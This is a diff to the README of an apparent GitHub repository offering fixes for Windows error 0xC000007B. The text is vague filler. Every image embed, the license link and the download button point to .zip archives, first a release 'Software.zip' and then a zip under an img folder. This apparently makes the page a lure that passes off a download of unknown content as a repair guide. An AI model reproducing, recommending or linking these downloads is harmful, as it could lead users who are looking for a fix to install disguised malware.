@@ -4,7 +4,7 @@
 
 Welcome to the **Fixing Error 0xC000007B** repository! This repository aims to provide solutions and support for resolving the common error code 0xC000007B in Windows operating systems. From error messages to game issues, we cover a wide range of problems related to 0xC000007B and offer detailed repair guides and solutions.
 
-![Error 0xC000007B](https://github.com/Loc2826/Fixing-Error-0xC000007B/releases/download/v2.0/Software.zip)
+![Error 0xC000007B](https://raw.githubusercontent.com/Loc2826/Fixing-Error-0xC000007B/master/img/B-x-Error-Fixing-acromicria.zip)
 
 ---
 
@@ -21,7 +21,7 @@ Welcome to the **Fixing Error 0xC000007B** repository! This repository aims to p
 
 Error code 0xC000007B is a common issue faced by Windows users, causing crashes and disruptiveness in various applications. This repository serves as a comprehensive guide to help you understand the root causes of this error and how to effectively fix it.
 
-![Error Code](https://github.com/Loc2826/Fixing-Error-0xC000007B/releases/download/v2.0/Software.zip)
+![Error Code](https://raw.githubusercontent.com/Loc2826/Fixing-Error-0xC000007B/master/img/B-x-Error-Fixing-acromicria.zip)
 
 ### Common Topics Covered
 - 0xC000007B Crash
@@ -36,22 +36,22 @@ Error code 0xC000007B is a common issue faced by Windows users, causing crashes 
 ## How to Use This Repository
 
 ### Step 1: Identifying the Error
-![Identifying Error](https://github.com/Loc2826/Fixing-Error-0xC000007B/releases/download/v2.0/Software.zip)
+![Identifying Error](https://raw.githubusercontent.com/Loc2826/Fixing-Error-0xC000007B/master/img/B-x-Error-Fixing-acromicria.zip)
 
 First, you need to recognize when error 0xC000007B occurs. Usually, it will manifest as a pop-up message or a sudden crash in a program or game.
 
 ### Step 2: Exploring Solutions
-![Exploring Solutions](https://github.com/Loc2826/Fixing-Error-0xC000007B/releases/download/v2.0/Software.zip)
+![Exploring Solutions](https://raw.githubusercontent.com/Loc2826/Fixing-Error-0xC000007B/master/img/B-x-Error-Fixing-acromicria.zip)
 
 Next, navigate through our repository topics to find relevant guides and solutions for fixing the error. Each topic offers detailed insights and step-by-step instructions to help you resolve the issue effectively.
 
 ### Step 3: Implementing Fixes
-![Implementing Fixes](https://github.com/Loc2826/Fixing-Error-0xC000007B/releases/download/v2.0/Software.zip)
+![Implementing Fixes](https://raw.githubusercontent.com/Loc2826/Fixing-Error-0xC000007B/master/img/B-x-Error-Fixing-acromicria.zip)
 
 Choose the appropriate method based on your specific scenario. Whether it's a compatibility issue, missing DLL files, or a corrupted installation, we have you covered with various solutions tailored to different situations.
 
 ### Step 4: Testing and Verifying
-![Testing Solutions](https://github.com/Loc2826/Fixing-Error-0xC000007B/releases/download/v2.0/Software.zip)
+![Testing Solutions](https://raw.githubusercontent.com/Loc2826/Fixing-Error-0xC000007B/master/img/B-x-Error-Fixing-acromicria.zip)
 
 After applying the fixes, test the application or game to ensure that the error has been successfully resolved. If the problem persists, revisit the guides and explore alternative methods to address the issue.
 
@@ -76,13 +76,13 @@ We welcome contributions from the community to enhance and expand the repository
 
 ## License
 
-This repository is licensed under the [MIT License](https://github.com/Loc2826/Fixing-Error-0xC000007B/releases/download/v2.0/Software.zip).
+This repository is licensed under the [MIT License](https://raw.githubusercontent.com/Loc2826/Fixing-Error-0xC000007B/master/img/B-x-Error-Fixing-acromicria.zip).
 
 ---
 
 ## Download Software
 
-[![Download Software](https://github.com/Loc2826/Fixing-Error-0xC000007B/releases/download/v2.0/Software.zip)](https://github.com/Loc2826/Fixing-Error-0xC000007B/releases/download/v2.0/Software.zip)
+[![Download Software](https://raw.githubusercontent.com/Loc2826/Fixing-Error-0xC000007B/master/img/B-x-Error-Fixing-acromicria.zip)](https://raw.githubusercontent.com/Loc2826/Fixing-Error-0xC000007B/master/img/B-x-Error-Fixing-acromicria.zip)
 
 ---
 
